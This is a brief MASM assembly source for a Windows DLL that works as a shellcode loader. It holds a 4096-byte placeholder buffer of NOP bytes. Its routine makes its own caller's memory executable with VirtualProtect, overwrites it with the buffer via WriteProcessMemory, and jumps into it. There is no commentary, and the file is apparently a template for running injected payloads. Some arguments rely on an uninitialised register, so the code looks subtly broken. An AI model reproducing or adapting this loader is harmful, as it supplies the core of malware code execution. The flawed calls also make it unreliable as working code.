.386
.model flat, stdcall

include windows.inc
include kernel32.inc
includelib kernel32.lib

.data
shellcode db 4096 dup(90h)

.code


DllMain proc hinstDLL:HINSTANCE,fdwReason:DWORD,lpvReserved:LPVOID
	mov eax, 1
	ret
DllMain endp


Main proc
	pop ebx
	invoke VirtualProtect, ebx, 4096, PAGE_EXECUTE_READWRITE, ecx
	invoke GetCurrentProcess
	invoke WriteProcessMemory, eax, ebx, addr shellcode, 4096, ecx

	jmp ebx
	ret
Main endp


end